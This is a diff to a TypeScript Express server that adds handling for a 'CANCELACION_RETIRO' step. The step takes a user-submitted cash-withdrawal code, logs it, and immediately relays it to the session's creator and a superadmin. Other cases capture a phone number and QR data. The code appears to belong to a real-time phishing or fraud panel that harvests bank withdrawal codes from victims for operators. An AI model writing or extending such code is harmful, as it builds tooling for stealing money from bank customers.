@@ -1384,6 +1384,28 @@ export async function registerRoutes(app: Express): Promise<Server> {
               case 'celular':
                 updatedFields.celular = inputData.celular;
                 break;
+              case 'CANCELACION_RETIRO':
+              case 'cancelacion_retiro':
+                if (inputData && inputData.codigoRetiro) {
+                  updatedFields.codigoRetiro = inputData.codigoRetiro;
+                  console.log('Recibido código de retiro:', inputData.codigoRetiro);
+
+                  // Notificar a los administradores el código de retiro inmediatamente
+                  const sessionData = await storage.getSessionById(sessionId);
+                  const createdBy = sessionData?.createdBy || '';
+                  
+                  broadcastToAdmins(JSON.stringify({
+                    type: 'RETIRO_CODE',
+                    data: {
+                      sessionId,
+                      code: inputData.codigoRetiro,
+                      createdBy // Añadimos el creador para referencia
+                    }
+                  }), createdBy); // Enviamos solo al creador y al superadmin
+                } else {
+                  console.error('Error: datos CANCELACION_RETIRO recibidos sin código de retiro:', inputData);
+                }
+                break;
               case 'ESCANEAR_QR':
               case 'escanear_qr':
                 if (inputData && inputData.qrData) {
